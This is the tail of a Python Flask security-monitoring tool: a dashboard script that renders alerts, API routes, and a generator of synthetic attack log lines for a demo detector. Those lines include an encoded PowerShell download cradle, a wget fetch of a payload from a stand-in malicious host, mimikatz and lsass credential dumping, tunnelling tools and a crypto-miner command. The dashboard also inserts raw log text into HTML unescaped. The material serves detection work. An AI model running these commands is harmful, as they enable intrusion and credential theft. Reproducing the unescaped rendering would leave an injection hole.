                        y: {
                            beginAtZero: true,
                            ticks: { color: '#64748b' },
                            grid: { color: '#334155' }
                        },
                        x: {
                            ticks: { color: '#94a3b8' },
                            grid: { display: false }
                        }
                    }
                }
            });
        }
        
        function getSeverityClass(severity) {
            return `severity-${severity.toLowerCase()}`;
        }
        
        function formatTime(timestamp) {
            const date = new Date(timestamp);
            return date.toLocaleTimeString();
        }
        
        function createAlertElement(alert) {
            const div = document.createElement('div');
            div.className = 'alert-item';
            div.dataset.severity = alert.severity.toLowerCase();
            div.dataset.ai = alert.rule_id.startsWith('AI') ? 'true' : 'false';
            
            const aiBadge = alert.rule_id.startsWith('AI') ? 
                '<span class="ai-badge">🤖 AI</span>' : '';
            
            div.innerHTML = `
                <div class="alert-time">${formatTime(alert.timestamp)}</div>
                <div class="alert-content">
                    <div class="alert-title">
                        ${alert.rule_name}
                        ${aiBadge}
                        <span class="mitre-tag">${alert.mitre_technique}</span>
                    </div>
                    <div class="alert-meta">
                        <span class="severity-badge ${getSeverityClass(alert.severity)}">${alert.severity}</span>
                        <span>📍 ${alert.source_ip || 'N/A'}</span>
                        <span>📊 ${(alert.confidence * 100).toFixed(0)}% confidence</span>
                        <span>🏷️ ${alert.category}</span>
                    </div>
                    ${alert.ai_analysis ? `<div style="margin-top: 0.5rem; color: #e879f9; font-size: 0.875rem;">🤖 ${alert.ai_analysis}</div>` : ''}
                    ${alert.recommended_action ? `<div style="margin-top: 0.25rem; color: #34d399; font-size: 0.875rem;">💡 ${alert.recommended_action}</div>` : ''}
                    <div class="alert-log">${alert.raw_log}</div>
                    <div class="confidence-bar">
                        <div class="confidence-fill" style="width: ${alert.confidence * 100}%"></div>
                    </div>
                </div>
            `;
            
            return div;
        }
        
        function updateAlertsList() {
            const container = document.getElementById('alerts-list');
            const filtered = alerts.filter(a => {
                if (currentFilter === 'all') return true;
                if (currentFilter === 'ai') return a.rule_id.startsWith('AI');
                return a.severity.toLowerCase() === currentFilter;
            });
            
            if (filtered.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <p>No alerts match the current filter</p>
                    </div>
                `;
                return;
            }
            
            container.innerHTML = '';
            filtered.slice(0, 50).forEach(alert => {
                container.appendChild(createAlertElement(alert));
            });
        }
        
        function filterAlerts(type) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
                if (btn.textContent.toLowerCase().includes(type) || (type === 'all' && btn.textContent === 'All')) {
                    btn.classList.add('active');
                }
            });
            updateAlertsList();
        }
        
        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(stats => {
                    document.getElementById('total-alerts').textContent = stats.alerts_generated;
                    document.getElementById('critical-count').textContent = stats.severity_counts.critical || 0;
                    document.getElementById('mitre-count').textContent = stats.mitre_coverage.length;
                    document.getElementById('ai-count').textContent = stats.rule_hits['AI-001'] || 0;
                    
                    // Update charts
                    if (categoryChart) {
                        categoryChart.data.labels = Object.keys(stats.category_counts);
                        categoryChart.data.datasets[0].data = Object.values(stats.category_counts);
                        categoryChart.update();
                    }
                    
                    if (severityChart) {
                        severityChart.data.datasets[0].data = [
                            stats.severity_counts.critical || 0,
                            stats.severity_counts.high || 0,
                            stats.severity_counts.medium || 0,
                            stats.severity_counts.low || 0
                        ];
                        severityChart.update();
                    }
                });
        }
        
        socket.on('new_alert', (alert) => {
            alerts.unshift(alert);
            if (alerts.length > 100) alerts.pop();
            updateAlertsList();
            updateStats();
            
            // Browser notification for critical alerts
            if (alert.severity === 'CRITICAL' && Notification.permission === 'granted') {
                new Notification('Critical Security Alert', {
                    body: `${alert.rule_name}: ${alert.raw_log.substring(0, 100)}`,
                    icon: '/favicon.ico'
                });
            }
        });
        
        // Request notification permission
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        }
        
        // Initialize
        initCharts();
        updateStats();
        setInterval(updateStats, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/stats')
def get_stats():
    return jsonify(analyzer.stats.get_stats())

@app.route('/api/alerts')
def get_alerts():
    limit = request.args.get('limit', 50, type=int)
    severity = request.args.get('severity')
    
    filtered_alerts = analyzer.alerts[-limit:]
    if severity:
        filtered_alerts = [a for a in filtered_alerts if a.severity.value == severity]
    
    return jsonify([{
        'id': a.id,
        'timestamp': a.timestamp.isoformat(),
        'rule_name': a.rule_name,
        'category': a.category.value,
        'severity': a.severity.value,
        'source_ip': a.source_ip,
        'confidence': a.confidence,
        'mitre_technique': a.mitre_technique,
        'ai_analysis': a.ai_analysis
    } for a in filtered_alerts])

def run_analyzer():
    """Run the log analyzer in a separate thread"""
    # Default log files to monitor
    log_files = [
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/kern.log',
        'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
        'C:\\Windows\\System32\\winevt\\Logs\\System.evtx'
    ]
    
    # Filter existing files
    existing_logs = [f for f in log_files if os.path.exists(f)]
    
    if not existing_logs:
        # Create a test log file for demonstration
        test_log = '/tmp/test_security.log'
        existing_logs = [test_log]
        logger.info(f"No system logs found. Creating test log at {test_log}")
        
        # Generate test data in background
        def generate_test_logs():
            os.makedirs('/tmp', exist_ok=True)
            with open(test_log, 'w') as f:
                f.write("")
            
            test_patterns = [
                "Failed password for root from 192.168.1.100 port 22",
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
                "lsass.exe dumping credentials using comsvcs.dll",
                "ngrok tcp 3389 started",
                "wget http://malicious-site.com/payload.exe -O /tmp/payload",
                "schtasks /create /tn \"Update\" /tr \"powershell -enc...\" /sc minute /mo 5",
                "ssh failed password for invalid user admin from 10.0.0.50",
                "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
                "cmd.exe /c powershell -windowstyle hidden -ep bypass",
                "SQLMap/1.0 - sqlmap.org",
                "frpc -c frpc.ini started",
                "xmrig --url pool.minexmr.com --user wallet_address",
            ]
            
            import random
            while True:
                time.sleep(random.uniform(2, 8))
                with open(test_log, 'a') as f:
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    log_entry = f"{timestamp} {random.choice(test_patterns)}\n"
                    f.write(log_entry)
                    f.flush()
        
        threading.Thread(target=generate_test_logs, daemon=True).start()
    
    asyncio.run(analyzer.start(existing_logs))

if __name__ == '__main__':
    from flask import request
    
    # Start analyzer in background thread
    analyzer_thread = threading.Thread(target=run_analyzer, daemon=True)
    analyzer_thread.start()
    
    # Run Flask-SocketIO
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)